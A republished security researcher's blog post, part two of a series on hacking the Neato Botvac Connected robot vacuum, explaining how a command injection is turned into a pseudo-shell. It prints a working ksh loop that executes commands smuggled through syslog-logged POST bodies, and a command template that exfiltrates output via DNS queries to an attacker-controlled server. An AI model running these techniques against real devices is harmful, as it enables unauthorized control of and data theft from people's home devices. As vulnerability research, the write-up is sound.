# Security in a Vacuum: Hacking the Neato Botvac Connected, Part 2

**Note** this post was originally published on the NCC Group Blog at https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/april/security-in-a-vacuum-hacking-the-neato-botvac-connected-part-2/ . However, it did not survive the NCC Group blog migration to a new platform, so I uploaded it here.

## Introduction 

This is the final section of a two-part blog series detailing how I went about attacking the Neato Botvac Connected WiFi-enabled robot vacuum.

In the last post I described how I discovered a command injection in the robot’s setup API, and the limitations I encountered while trying to use it. This post will detail how I developed a command I/O channel using the very limited toolset on the QNX-based robot to obtain a pseudo command shell.

## Toolset

### USB Drive

The system allows users to attach a USB thumb drive for updating the firmware and dumping system logs. I found the script which mounts the drive in `/bin/check_for_usb_mount.sh`. The relevant lines are below:

```
MOUNT_PATH=/proc/boot/mount
…
${MOUNT_PATH} -t dos /dev/usbhd0 /usb
```

Although I was still planning to come up with a purely network-based means of command I/O which didn't require physical access to the robot, this was useful in the interim. I could put shell scripts on the drive, mount the drive & execute them via the command injection, then redirect their output to a file. Additionally, this allowed me to dump the contents of the filesystem to the drive.

### Utilities

Inspecting the files dumped to the USB drive from the robot's filesystem, I discovered that the robot runs QNX and has a limited set of utilities on it:

```
cat cp date dd devb-mmcsd-am335x devb-ram devb-umass devc-seromap devc-serusb_dcd dhcp.client dhcpd dm814x-wdtkick dumper echo env getconf grep gunzip gzip i2c-omap35xx-j5 if_up ifconfig io-audio io-pkt-v4-hc io-usb io-usb-dcd ksh logger ls mkdir mount mqueue mv netstat nicinfo ntpdate on ping pipe procnto random rm rmdir route setconf setkey shutdown slay sleep slogger sloginfo tar touch traceroute ulink_ctrl umount usb waitfor
```

The tools that *are* present, such as `grep` and `ksh`, lack a lot of the useful options present in the full version, making string manipulation particularly challenging.

Mounting an NFS or SMB share seemed like a promising option, but unfortunately `mount` on the robot does not have those filesystem types available. Other than that, there doesn’t seem to be any tools in the list which would directly handle both receiving commands and sending command output, so I decided to perform input and output separately.

## Input

From the list of tools, the ones which receive input (either directly or indirectly) from the network seem to be:

```
dhcp.client dhcpd ping traceroute sloginfo ntpdate
```

From this, I decided that `sloginfo` was the most promising. `sloginfo` is a QNX utility which lets you read from the system log. I figured that requests to the API server may be logged in the syslog, from which I could extract them and run them as commands. To test this idea, I made a POST request to the robot’s setup API with a path of `/asdf` and a body of “qwerty”, and was able to observe the following entries in the log by running `sloginfo`:  

```
Feb 24 15:26:52.746    6 10003     0 :ev_handler:874 NEATO: Received data from the App:
Method: POST
URI /asdf Body Length:4 
Feb 24 15:26:52.746    6 10003     0 :ev_handler:878 Working Buffer 5: qwerty
```
  
From here, I needed to write a `ksh` script which extracts and runs the POST bodies of certain requests. This `ksh` script had to overcome some strict limitations:

* It needed to be less than 128 characters long, as this is the size limit of the `ntp` parameter to `/robot/initialize`.
* As mentioned, the system has an extremely limited version of `ksh` with no string manipulation functions and does not have `sed`, `awk`, etc.

The script that I came up with is as follows:

```
while :;do for m in $(sloginfo -c|grep :878);do [ $m = %%%%% ]&&eval 'echo $c|ksh&c='||c=$c\ $m;done;done
```

I’ll explain the various bits below:

```
while :;do …;done
```

This is the shortest way that I found to write an infinite loop in ksh.

```
for m in $(sloginfo -c|grep :878);do 
```

I needed some way to iterate through the text in the syslog which was relevant to me so I could parse it. All entries containing POST bodies seemed to have “:878” in them, so I grepped for that. This will loop through items separated by whitespace on lines containing :878. The `-c` flag to `sloginfo` clears the log afterwards, so that we don’t have to worry about commands being run multiple times — each invocation of `syslog -c` shows only *new* log entries. 

```
[ $m = %%%%% ]&&eval 'echo $c|ksh&c='||c=$c\ $m;
```

This is where I had to get clever with saving space. 

* `m` is the token in our loop — the current item in the log line, if you split the line by whitespace.
* `c` is a command string that we build up through iterations of the loop.

Using `[ condition ]&&...||...;` is a space-saving measure which gets rid of the `if [ condition ];then ...;else ...;fi` construct. 

What the script does: 

* Continually polls the syslog for new entries.
* Loops over tokens in the entries, building up a string `c` containing the concatenated command string.
* If our current token is “%%%%%”, then we will execute the `c` string we have collected so far with `ksh`, and clear `c`.
* If our current token is not “%%%%%”, then we concatenate the token onto the command string and continue iterating.

How it works:  

* The attacker will send commands in POST bodies wrapped in “ %%%%% ” tokens.
* The script will reach the first “%%%%%”, execute the `c` buffer it has collected so far (which is just garbage), and clear `c`. 
* Then it will fill `c` back up with the actual command string until it reaches “%%%%%” again. 
* The script will then run `c`, which now contains the command that we want to execute.

Now we have blind command execution by sending POST requests to the API server.

## Output

I ultimately decided to stick with exfiltrating data via DNS by invoking the `ping` command. My strategy was:

1. Modify `/etc/resolv.conf` to point to an attacker-controlled rogue DNS server.
2. Encode output in such a way that it could be transmitted over DNS, then feed it to the `ping` command, which will issue a DNS request.

For step 2 — there is no `base64` or `xxd` utilities on the system, and implementing them in `ksh` proved to be too difficult, so I decided to attempt to write my own encoder. I needed to overcome these challenges:

1. Encoding all of the “bad” characters which can’t be transmitted over DNS.
2. Breaking the message into chunks with a maximum length of 63 characters each, since this is the max length of a [DNS label](https://en.wikipedia.org/wiki/Domain_Name_System#Domain_name_syntax).
3. Doing all this with super limited toolset.

What I came up with is too large to go over line-by-line, but I will outline the approach below and you can inspect the code for yourself on [GitHub](https://github.com/jkielpinski/vacuum-sec/blob/master/encode.ksh). 

The main tool I used for processing strings was the `$IFS` variable which tells `ksh` what to split on when performing `for` loops. Besides this, I was able to obtain string lengths with `${#str}`. There were no additional string manipulation functions available.

**Encoding bad characters:**

1. I created a `replace()` function which sets `$IFS` to the bad character we wish to eliminate, then loops over the string. It concatenates all iterations together and between them it inserts “x” plus the hexadecimal value of the bad character. For example,  “!” is replaced with “x21”.
2. The script manually calls this function for each non-alphanumeric character in ASCII, plus “x” itself (since that is now a special character).

**Segmenting the message into 63-character blocks:**

The script has a `segment()` function which works in the following way:

1. Loops through a list of printable characters and assign the current character to `$char`
2. Set `$IFS` to `$char`, and loop over the remaining payload which we need to send.
3. If some combination of the segments of the string split by `$char` is between 42 and 62 characters long, then we choose this as the data to send. Then we remove it from the payload by replacing the payload with the concatenation of remaining segments.
4. Prepend an index number to the block followed by a period, so that it can be reassembled in proper order.

## Putting It All Together

The exploitation process looks like this:

1. Establish blind command execution via the syslog method described above.
2. Either wait for  the robot to update the time from the NTP server or reboot it, thereby initiating the syslog polling.
3. Use the command execution to set the attacker machine as a DNS server.
4. Use the command execution to upload the custom DNS encoding shell script to `/tmp` via a series of `echo` commands.
5. Send commands wrapped in “ %%%%% “ via POST requests to any endpoint. If output is desired, commands should be of the form `for line in $([DESIRED COMMAND HERE] 2>&1 | ksh /tmp/encode.ksh);do eval 'ping -c 1 $line&';done`. This encodes the command output via the encoding script described above, then passes each segment to `ping` so that it will be sent as a DNS request to the attacker machine.
6. Receive the DNS requests on the attacker machine, reassemble and decode them to read the output of the command.

A proof of concept Python script which automates this process can be found on [GitHub](https://github.com/jkielpinski/vacuum-sec/).

## Conclusion

Thanks for reading, that concludes the two-part series. I hope it gave you some ideas for vulnerability hunting and exploitation of similar devices.
